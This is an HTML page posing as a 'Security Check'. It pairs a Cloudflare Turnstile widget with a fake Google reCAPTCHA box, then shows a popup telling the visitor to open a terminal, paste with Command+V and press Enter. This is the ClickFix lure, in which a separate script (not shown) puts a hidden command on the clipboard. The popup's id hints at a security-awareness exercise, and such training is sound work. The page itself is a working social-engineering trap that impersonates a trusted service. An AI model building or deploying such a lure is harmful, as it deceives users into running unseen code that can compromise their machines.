<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Check</title>
    <link rel="stylesheet" href="style.css">
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
</head>
<body>

    <div class="cf-turnstile" data-sitekey="0x4AAAAAAB3w-j_jVkZli_hE" data-callback="onTurnstileSuccess"></div>

    <div id="main-content" class="hidden">

        <div class="recaptcha-container">
            <div class="recaptcha-box">
                <input type="checkbox" id="not-a-robot-checkbox">
                <label for="not-a-robot-checkbox">I'm not a robot</label>
            </div>
            <div class="recaptcha-footer">
                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA logo">
                <span>reCAPTCHA</span>
                <span class="privacy-terms">Privacy - Terms</span>
            </div>
        </div>

        <div id="awareness-popup" class="popup-hidden">
            <div class="popup-content">
                <h2>Ops, something went wrong !</h2>
                <p>Please verify yourself with this additional step by following the instructions below.</p>
                <p>
                    1. Open your terminal <br>
                    2. Press âŒ˜ + V <br>
                    3. Press Enter
                </p>
                <button id="close-popup">I understand</button>
            </div>
        </div>

    </div> <script src="script.js"></script>
</body>
</html>
